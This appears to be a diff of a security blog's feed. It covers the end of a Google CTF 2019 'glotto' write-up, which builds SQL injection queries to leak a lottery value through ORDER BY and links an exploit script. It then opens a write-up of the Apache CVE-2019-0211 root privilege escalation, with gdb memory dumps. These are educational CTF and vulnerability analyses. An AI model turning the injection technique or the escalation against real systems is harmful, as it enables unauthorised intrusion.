+&lt;span class="mi"&gt;4&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;   &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt;     &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="mi"&gt;5&lt;/span&gt;  &lt;span class="mi"&gt;7&lt;/span&gt;      &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt;     &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;span class="mi"&gt;6&lt;/span&gt;  &lt;span class="mi"&gt;4&lt;/span&gt;      &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt;        &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;2&lt;/span&gt;      &lt;span class="mi"&gt;2&lt;/span&gt;            &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As you can see, our remainders are back. We can then use them to reconstruct the number.&lt;/p&gt;
+&lt;h2&gt;From 1 table to 4&lt;/h2&gt;
+&lt;p&gt;Now that we have a fully working strategy for 1 table, we can apply it to the 3 others. The first table gets us &lt;code&gt;8!&lt;/code&gt; outputs, the second &lt;code&gt;9!&lt;/code&gt;, and the two last &lt;code&gt;7!&lt;/code&gt; and &lt;code&gt;4!&lt;/code&gt; respectively.
+To merge these values into a bigger number, we can apply the same DIVMOD strategy that we did before:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;@lotto&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;march&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;march&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;march&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0, 8![&lt;/span&gt;
+&lt;span class="n"&gt;D[march&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;april&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;april&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;april&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0, 9![&lt;/span&gt;
+&lt;span class="n"&gt;D[april&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;may&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;may&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;may&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0, 7![&lt;/span&gt;
+&lt;span class="n"&gt;D[may&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;june&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;june&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;june&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="err"&gt;![&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Since we only have 4 tables, &lt;code&gt;D[june]&lt;/code&gt; cannot be determined, it's the part we leave up to luck. What are the potential values of &lt;code&gt;D[june]&lt;/code&gt; ? Well, by definition, &lt;code&gt;D[june]&lt;/code&gt; is the total possible values of @lotto, &lt;code&gt;36**12&lt;/code&gt;, divided by the multiplication of previous divisors, &lt;code&gt;8!9!7!4!&lt;/code&gt;. This gives us &lt;code&gt;36**12 / (8!9!7!4!) = 2677.34&lt;/code&gt;, the number we expected to bruteforce !&lt;/p&gt;
+&lt;h1&gt;Solving the math problem using MySQL&lt;/h1&gt;
+&lt;p&gt;Now that we've got all our base math set up, we can try and solve the problem using our 4 SQL injections. Once again, we'll focus on the first table, as the others are similar.&lt;/p&gt;
+&lt;p&gt;We already know how to convert the ticket into a base10 number (&lt;code&gt;CONV(@lotto, 36, 10)&lt;/code&gt;), and the dates into sequential numbers, from 0 to 7 (&lt;code&gt;FIND_IN_SET(MID(date, 9), '01,03,05,10,13,18,23,28,30') - 1&lt;/code&gt;).&lt;/p&gt;
+&lt;h2&gt;Computing remainders&lt;/h2&gt;
+&lt;p&gt;Building the list of &lt;code&gt;r8&lt;/code&gt; to &lt;code&gt;r2&lt;/code&gt; is easy; we can use a subquery and make aliases:
+Assuming &lt;code&gt;@v&lt;/code&gt; is the number between &lt;code&gt;0&lt;/code&gt; and &lt;code&gt;8!&lt;/code&gt; that we need to bruteforce, we have:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;inner_query&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;                  &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="n"&gt;DIV&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;          &lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="n"&gt;DIV&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;     &lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="n"&gt;DIV&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now, we need to convert our remainders into valid indices, as we did in the above &lt;a href=""&gt;Transmitting&lt;/a&gt; part.&lt;/p&gt;
+&lt;h2&gt;Remainders to indices&lt;/h2&gt;
+&lt;p&gt;We need to find a way to maintain a list of the remaining available indices, as well as isolate which indice corresponds to which remainder. Since MySQL does not handle arrays, a string seems to be a good candidate, as it allows us to work with a lot of string functions, such as &lt;a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_mid"&gt;MID()&lt;/a&gt; (i.e. &lt;code&gt;SUBSTR()&lt;/code&gt;).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;middle_query&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="k"&gt;SELECT&lt;/span&gt; 
+    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s9&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;01234567&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;         &lt;span class="c1"&gt;-- Initial &amp;quot;array&amp;quot; of remaining indices&lt;/span&gt;
+
+    &lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r8&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;i8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;    &lt;span class="c1"&gt;-- We extract the indice i8 which corresponds to r8&lt;/span&gt;
+    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s8&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CONCAT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;             &lt;span class="c1"&gt;-- We build @s8, which contains remaining indices...&lt;/span&gt;
+        &lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;       &lt;span class="c1"&gt;-- by removing the indice at position r8&lt;/span&gt;
+        &lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r8&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;       &lt;span class="c1"&gt;-- and we can repeat this ...&lt;/span&gt;
+    &lt;span class="p"&gt;),&lt;/span&gt;                         &lt;span class="c1"&gt;-- until r2&lt;/span&gt;
+
+    &lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r7&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;i7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;    &lt;span class="c1"&gt;-- We extract the indice i7 which corresponds to r7 from the remaining array&lt;/span&gt;
+    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s7&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CONCAT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;             &lt;span class="c1"&gt;-- We build @s7, which contains remaining indices...&lt;/span&gt;
+        &lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;       &lt;span class="c1"&gt;-- by removing the indice at position r7&lt;/span&gt;
+        &lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;s8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r7&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;       &lt;span class="c1"&gt;-- and so on&lt;/span&gt;
+    &lt;span class="p"&gt;),&lt;/span&gt;
+
+    &lt;span class="p"&gt;...&lt;/span&gt;
+
+&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;inner_query&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We now have &lt;code&gt;i8&lt;/code&gt; to &lt;code&gt;i2&lt;/code&gt;, which are the column indices that correspond to our &lt;code&gt;r8&lt;/code&gt; to &lt;code&gt;r2&lt;/code&gt; remainders.
+We want the date with index &lt;code&gt;i8&lt;/code&gt; to be in the first position; the date with index &lt;code&gt;i7&lt;/code&gt; to be in the second position, and so on.
+To do so, we build a string which compares the current column with the expected indices:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;outer_query&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;CONCAT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;i8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;i7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="p"&gt;...&lt;/span&gt;
+    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;i2&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;middle_query&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The resulting string will be something like &lt;code&gt;00001000&lt;/code&gt; for each row, with the &lt;code&gt;1&lt;/code&gt; indicating at which position the row should be on the list.
+When applied to the ORDER BY clause, those &lt;code&gt;00010000&lt;/code&gt; numbers will be used to sort the rows, which will have the expected effect of putting each date at the correct position.
+For instance, if &lt;code&gt;i8=4&lt;/code&gt;, the fourth date will yield this number: &lt;code&gt;10000000&lt;/code&gt;, while the others won't have their MSB set. This means that the fourth date will have the highest number,
+and therefore be put first in the list.&lt;/p&gt;
+&lt;p&gt;We're done !&lt;/p&gt;
+&lt;h1&gt;Exploit&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://github.com/cfreal/exploits/blob/master/gctf-2019-glotto/exploit.py"&gt;Here's the exploit&lt;/a&gt;.
+Since there's a 5 seconds wait after checking if a ticket is valid, you should run around 10 of them concurrently, until you get a match.
+Also, there are a few tiny MySQL tricks hidden in the exploit, so you might benefit from reading it if you're new.&lt;/p&gt;</content><category term="google"></category><category term="CTF"></category><category term="quals"></category><category term="2019"></category><category term="glotto"></category><category term="writeup"></category><category term="SQL"></category><category term="injection"></category><category term="ORDER BY"></category></entry><entry><title>CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation</title><link href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html" rel="alternate"></link><published>2019-04-03T00:00:00+02:00</published><updated>2019-04-03T00:00:00+02:00</updated><author><name>Charles Fol</name></author><id>tag:cfreal.github.io,2019-04-03:/carpe-diem-cve-2019-0211-apache-local-root.html</id><summary type="html">&lt;p&gt;Since version 2.4.17 (Oct 9, 2015), up until version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;From version 2.4.17 (Oct 9, 2015) to version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.
 The vulnerability is triggered when Apache gracefully restarts (&lt;code&gt;apache2ctl graceful&lt;/code&gt;).
 In standard Linux configurations, the &lt;code&gt;logrotate&lt;/code&gt; utility runs this command once a day, at 6:25AM, in order to reset log file handles.&lt;/p&gt;
@@ -9,77 +181,77 @@ In standard Linux configurations, the &lt;code&gt;logrotate&lt;/code&gt; utility
 In order to get feedback from its workers, Apache maintains a shared-memory area (SHM), &lt;code&gt;scoreboard&lt;/code&gt;, which contains various informations such as the workers PIDs and the last request they handled.
 Each worker is meant to maintain a &lt;code&gt;process_score&lt;/code&gt; structure associated with its PID, and has full read/write access to the SHM.&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;ap_scoreboard_image: pointers to the shared memory block&lt;/em&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) p *ap_scoreboard_image 
-$3 = {
-  global = 0x7f4a9323e008, 
-  parent = 0x7f4a9323e020, 
-  servers = 0x55835eddea78
-}
-(gdb) p ap_scoreboard_image-&amp;gt;servers[0]
-$5 = (worker_score *) 0x7f4a93240820
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt; 
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+  &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7f4a9323e008&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;parent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7f4a9323e020&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;servers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x55835eddea78&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;servers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;worker_score&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7f4a93240820&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;em&gt;Example of shared memory associated with worker PID 19447&lt;/em&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent[0]&lt;/span&gt;
-&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-  &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;19447&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;generation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;quiescing&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;\000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;not_accepting&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;\000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;connections&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;write_completion&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;lingering_close&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;keep_alive&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
